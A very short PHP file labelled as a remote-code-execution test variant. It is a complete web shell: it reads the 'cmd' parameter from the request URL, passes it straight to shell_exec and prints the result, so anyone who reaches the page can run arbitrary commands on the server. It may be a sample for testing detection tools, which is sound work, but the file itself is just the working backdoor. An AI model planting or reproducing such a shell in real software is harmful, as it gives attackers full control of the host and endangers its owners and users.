<?php
// RCE test variation #42
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>